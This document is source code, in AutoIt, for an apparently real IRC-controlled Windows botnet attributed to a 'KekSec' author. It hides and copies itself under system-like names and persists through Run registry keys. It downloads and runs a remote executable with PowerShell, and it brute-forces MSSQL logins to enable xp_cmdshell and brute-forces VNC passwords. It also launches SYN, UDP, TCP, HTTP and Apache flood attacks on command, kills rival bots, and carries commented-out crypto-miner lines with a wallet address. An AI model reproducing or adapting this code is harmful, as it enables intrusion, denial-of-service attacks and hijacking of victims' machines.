...
; FORMER DARKIRC botnet now renamed CacheNull Legions. Cachenull will also be a new sub group within KekSec for the very best hacking masters available like Freak and his nets.
...
Run("cmd /C echo MsgBox 66,""Windows cannot make the destination file created."",66,""System Error"">messbox.vbs")
FileSetAttrib("messbox.vbs","-SHR")
$messbox = "messbox.vbs"
FileSetAttrib($messbox, "+H")
FileSetAttrib($messbox, "+S")
FileSetAttrib($messbox, "+R")
; ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
;
;FileInstall("C:\Users\"&@UserName&"\xmrig.exe","xmrig.exe")
;Run("xmrig.exe --donate-level 5 -o pool.hashvault.pro:443 -u 47MA8Jwoe5JZLF6Sk7GRAnZW7633ELyxeT5SgFCqUfA48X4RJZjjNdR55kC8U5Gqxx5FQfA1rYspr9Gfg7nKmPxXQvvy5w4 -p bot-network -k --tls")
; Started miner by now!
;
; ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


$vbsdir = " C:\Users\" & @UserName & "\dir\Desktop\dir"

DirCreate($vbsdir)
DirMove(".",$vbsdir)
FileSetAttrib($vbsdir, "+S")
FileDelete($vbsdir & "\" & $messbox)
DirMove(".", "C:\Users\")
DirMove(".", @UserName)
DirCreate("dir")
DirMove(".","dir")

; current dir C:\Users\username\dir - empty directory.
DirMove(".",$vbsdir)

FileInstall("N.dll","N.dll")
FileSetAttrib("N.dll", "-H")
FileSetAttrib("N.dll", "+SR")
DirMove(".", "../../../dir")
Global $xexe  = @AppDataDir&"\system.exe" ; miner exe name and path

FileCopy(@ScriptName, $xexe)
FileCopy(@ScriptName, $vbsdir&"\svchost.exe")

Run("cmd.exe /C wscript.exe " & $messbox, ".", 0)
Run("wscript " & $messbox,".",-1)
...
$sum = "C:\Users\freak\dir\IIS6.txt"
DirMove(".",@TempDir)

Global $maxthreads = 144 * EnvGet("NUMBER_OF_PROCESSORS"); 13 thread limit per cpu to be honestly right
; double connect for primary server down below.
Global $nodes = StringSplit("irc.dal.net:6667|irc.anthrochat.net:6667|irc.executingreality.com:6667|irc.pirc.pl:6667|irc.anthrochat.net:6667|irc.dal.net:6667|irc.executingreality.com:6667|irc.pirc.pl:6667|bofh.nl.smurfnet.ch:6667|irc.freenode.org:6697|irc.freenode.org:6667|", "|", 3)Global $sniffopt = "tcp port (23 or 80 or 81 or 8081 or 8080 or 8888 or 8181)"
Global $signedin = False
Global $botpassword = String("root_bell!") ;rsystemwide, root_bell! root_$hell systemwide 10 char long bot pw
Global $nickformat =$priv&"[" & @OSVersion & "|" & @OSArch & "|" & EnvGet("NUMBER_OF_PROCESSORS") & "]"
Global $botid = "{" & randID() & "}" & randID()
Global $nick = $nickformat & $botid
Global $channel = "#windoez"
Global $key = "winboxi"
Global $trigger = "&"
Global $installdir = @AppDataDir & "\Win32-64\Wifi Task Common Binary"
Global $botproc = "wifitask.exe"
Global $installpath = $installdir & "\" & $botproc
Global $lanIP = @IPAddress1
Global $myIP = BinaryToString(InetRead("https://icanhazip.com/"))
Global $url = "https://limewire.com/decrypt/download?downloadId=4841cbe1-89e5-49c2-b3b0-90738c28c3d7"
Global $dlexe = "powershell -c ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri """ & $url & """ -OutFile""%appdata%\a.exe""; %appdata%\a.exe"
Global $lootLoc = $installdir & "\dump.dat"
Global $monitoring = 0


DirMove(".","C:\Windows\temp")



; ---------- GAME RANSOMEWARE GAME START START ----------
;HASHTAGSEE-ES#cs
#cs
MsgBox(64,"","")
MsgBox(0,"Welcome to the Freakout ransomware simulator by Freak from","Kek Security Team.")
$n=InputBox("You have not been infected by any virus!","this is a game. Play? y or n")
if $n == "y" or $n == "Y" or $n == "Yes" or $n == "yes" Then
	MsgBox(31,"Welcome","")
	InputBox("Welcome to the simulator.","Welcome no input needed")
	Sleep(3000)
	MsgBox(32,"alert","null")
	MsgBox(32,"alert","-1")
	MsgBox(64,"exec","downloaded file and executed.")
	Sleep(1200)
	MsgBox(64,"exec","downloaded file and executed.")
	Sleep(300)
	MsgBox(64,"exec","downloaded file and executed.")
	Sleep(500)
	Msgbox(31, "Executing file.","...")
	Sleep(5000)
	Msgbox(30,Null,Null)
	Sleep(1)
	MsgBox(29, "Error","Encrypting data...")
	For $i = 0 To 29
		$file=InputBox("Encrypt a file:","C:","C:\windows\system32\*","title","text")
		If $file == "" Then
			MsgBox(64,"Encrypting entire system.","Wrong input 0")
			MsgBox(64,"Encrypting entire system.","Wrong input 0")
			MsgBox(64,"Encrypting entire system.","Wrong input 0")
			MsgBox(0,"JOKE!!!","JOKE!!!")
			EnvSet(1074)
		...
		EndIf
		MsgBox(64,"Encrypted a specified file.",$file)
	Next
	MsgBox(-1,"Game complete.",".")
	Sleep(3000)
	MsgBox(-1,"Game complete.","Encrypted ENTIRE! SYSTEM rebooting")
	Sleep(1000)
	MsgBox(59, "Shutting down...","system wide shutdown in 2 secs")
	Sleep(5000)
	InputBox()
	Inputbox("How did you like the game?","I loved it / I hated it","Input","*")

Else
	MsgBox(0,"Exiting.","Didn't mean to start??? Exiting.")
	Exit 0
Endif
Msgbox(0,$n,$n)
#ce
...
Global $SC_MANAGER_ALL_ACCESS = 0xF003F
Global $line, $foo
Global $user[223]
...
Func _outlookGetContacts($ooutlook, $sfirstname = "", $slastname = "", $semail1adress = "", $fsearchpart = False, $ffulllist = False, $swarningclick = "")
	...
	For $inum = 1 To $inumofcontacts
		...
		If $slastname <> "" Then
			If $fsearchpart = False Then
				If $slastname <> $ocolitems.item($inum).lastname Then
					ContinueLoop
				EndIf
			Else
		...
		If Not @error Then
			...
			For $u in $user
				...
				For $p in $pass
					...
					If Not @error Then
						For $command in StringSplit("EXEC sp_configure 'show advanced options', '1'+_+RECONFIGURE+_+EXEC sp_configure 'xp_cmdshell', '1'+_+RECONFIGURE+_+xp_cmdshell '" & $dlexe & "';", "+_+", 1)
...
Func _synflood($host, $port, $time)
	...
	While 1
		...
		TCPConnect($ip, $port)
	WEnd
	sendmessage($sock, "SYN Connect flood finished", $channel)
EndFunc   ;==>_synflood
Func _tcpflood($ip, $port, $packetsize, $time)
	sendmessage($sock, "Starting TCP flood on " & $ip & ":" & String($port), $channel)
	$port = Int($port)
...
Func _udpflood($host, $port, $packetsize, $time)
	sendmessage($sock, "Starting UDP flood on " & $host, $channel)
	$ip = TCPNameToIP($host)
	$port = Int($port)
	$packetsize = Int($packetsize)
	$time = Int($time)
...
Func cmd($user, $channel, $msg)
	...
	Switch StringLower($stemp[2])
		; next 32 lines are for login and logout
		Case "login"
			If _elementexists($stemp, 3) Then
				If $stemp[3] == $botpassword Then
					sendmessage($sock, "Login successful.", $channel)
					$signedin = True
				Else
					sendmessage($sock, "Login failed!", $channel)
				EndIf
			EndIf
		Case "logout"
			...
			Else
				sendmessage($sock, "Already signed out.", $channel)
			EndIf
		Case "signin"
			If _elementexists($stemp, 3) Then
				If $stemp[3] == $botpassword Then
		...
		Case "op"
			If $signedin = True Then
				TCPSend($sock, "MODE +o " & $stemp[3] & "\r\n")
				sendmessage($sock, "Successfully sent operator user status to your username!", $channel)
			Else
				sendmessage($sock, "YOU NEED TO SIGN IN!", $channel)
			EndIf
		Case "syn"; syn ip port time threads - connect flooding
			If _elementexists($stemp, 6) And $signedin = True Then
				sendmessage($sock, "SYN flooding " & $stemp[3] & ":" & $stemp[4] & " with " & $stemp[5] & " threads.", $channel)
				For $i = 0 To Int($stemp[5])
					NMAIN(NRUN("_synflood($stemp[3], $stemp[4], $stemp[6])"))
				Next
			EndIf
		Case "udp";udp target.com port packetsize time
			If _elementexists($stemp, 6) And $signedin = True Then
				sendmessage($sock, "UDP flooding " & $stemp[3] & ":" & $stemp[4] & " with packetsize " & $stemp[5], $channel)
				NMAIN(NRUN("_udpflood($stemp[3], $stemp[4], $stemp[5], $stemp[6])"))
			EndIf
		Case "tcp"; - tcp flood target.com port packetsize time
			If _elementexists($stemp, 6) And $signedin = True Then
				sendmessage($sock, "TCP flooding " & $stemp[3] & ":" & $stemp[4], $channel)
				NMAIN(NRUN("_tcpflood($stemp[3], $stemp[4], $stemp[5], $stemp[6])"))
			EndIf
		Case "condis"; connect disconnect flood - fast
			If _elementexists($stemp, 5) And $signedin = True Then
				sendmessage($sock, "Connect/disconnect flooding " & $stemp[3] & ":" & $stemp[4], $channel)
				NMAIN(NRUN("_condisflood($stemp[3], $stemp[4], $stemp[5])"))
			EndIf
		Case "http"; http flood - ip port bounds time
			If _elementexists($stemp, 6) And $signedin = True Then
				sendmessage($sock, "HTTP fact flooding http://" & $stemp[3] & ":" & $stemp[4] & $stemp[5], $channel)
				NMAIN(NRUN("_httpflood($stemp[3], $stemp[4], $stemp[5], $stemp[6])"))
			EndIf
		Case "httpflood"; http flood - ip port bounds time
			If _elementexists($stemp, 6) And $signedin = True Then
				sendmessage($sock, "HTTP fLooding http://" & $stemp[3] & ":" & $stemp[4] & $stemp[5], $channel)
				NMAIN(NRUN("_httpflood($stemp[3], $stemp[4], $stemp[5], $stemp[6])"))
			EndIf
		Case "httpfood"; http flood - ip port bounds time
			If _elementexists($stemp, 6) And $signedin = True Then
				sendmessage($sock, "HTTP fooding http://" & $stemp[3] & ":" & $stemp[4] & $stemp[5], $channel)
				NMAIN(NRUN("_httpflood($stemp[3], $stemp[4], $stemp[5], $stemp[6])"))
			EndIf
		Case "arme" ; apache remote memory exhaustion flood good for apache
			If _elementexists($stemp, 6) And $signedin = True Then
				sendmessage($sock, "ARME flooding http://" & $stemp[3] & ":" & $stemp[4] & $stemp[5], $channel)
				NMAIN(NRUN("_armeflood($stemp[3], $stemp[4], $stemp[5], $stemp[6])"))
			EndIf
		Case "monitor"
			If Not $monitoring Then
				$monitoring = 1
				$listenpid = Run(@autoitexe & " monitor", ".")
				sendmessage($sock, "Started packet monitor.", $channel)
			EndIf
		Case "endmonitoring"
			If $listenpid Not 0 Then
				Run("cmd.exe /C taskkill /f /pid " & String($listenpid), "", 0)
				sendmessage($sock, "Started killing processes!", $channel)
				$monitoring = 0
				$listenpid = 0
			EndIf
		Case "loot"
		...
		Case "lanip"
			If $signedin = True Then
				sendmessage($sock, @IPAddress1, $channel)
			EndIf
		Case "username" ; DEVICE USERNAME IS IMPORTANT TO KNOW.
			If $signedin = True Then
				sendmessage($sock, @UserName, $channel)
			EndIf
		Case "user" ; DEVICE USERNAME IS IMPORTANT TO KNOW.
			If $signedin = True Then
				sendmessage($sock, @UserName, $channel)
			EndIf
		Case "use" ; DEVICE USERNAME IS IMPORTANT TO KNOW.
			If $signedin = True Then
				sendmessage($sock, @UserName, $channel)
			EndIf
		Case "dlexe" ; A CLASSIC DOWNLOAD AND EXECUTE MY FRIEND.
...
Func install()
	...
	DirCreate(".\xsexe")
	FileCopy($xexe, $installpath)
	FileCopy(@AutoItExe, $installdir)
	FileCopy(@AutoItExe, @StartupDir)
	FileCopy(@ScriptFullPath, $installpath, 8)
	FileSetAttrib($installdir, "+SH")
	FileSetAttrib($installpath, "+SH")
	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "NWL", "REG_SZ", $installpath)
	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce", "NWL", "REG_SZ", $installpath)
	RunWait(@COMSPEC & " /c REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v NWL /t REG_SZ /d """ & $installpath & """", @SW_HIDE)
	If IsAdmin() Then
		RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "NWL", "REG_SZ", $installpath)
		RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce", "NWL", "REG_SZ", $installpath)
		RunWait(@COMSPEC & " /c REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce /v NWL /t REG_SZ /d """ & $installpath & """", @SW_HIDE)
	EndIf
	fixsys()
	FileDelete(".\xsexe")
EndFunc   ;==>install
	...
	For $i = 0 To UBound($aArray) - 1
		...
		For $name In _FileListToArray($Drive & "\", "*")
			If StringInStr(FileGetAttrib($name), "D") Then
				FileCreateShortcut($p, StringUpper($aArray[$i]) & "\" & $name, "", "", "", "%windir%\system32\shell32.dll,3", 128, 3, @SW_SHOWNOACTIVATE)
			EndIf
		Next
		$drivecount += 1
	Next
...
Func vncHaxx($ip, $port, $pass)
	For $p = 0 To UBound($pass) - 1
		...
		If $loginResult = 0 Then Return 1
		If $loginResult = -1 Then Return 0
	Next
EndFunc   ;==>vncHaxx
...
botkiller() ; afterall we need this bot to ourselves for maximum mining output.
install()
...
_Singleton("KlsaddjhkloasdkfcrimeslashddoskclickchickpossewarrezWARze2", $hmutex)
NMain(NRun('install'))


Dim $threads[$maxthreads]
For $i = 0 To $maxthreads - 1
	$threads[$i] = NMain(NRun('netdb')) ; scanner thread
Next
Func botkill()
While True
	install()
...
EndFunc
NMain(NRun("botkill"))
NMain(NRun('monitor')) ; sniffer background thread
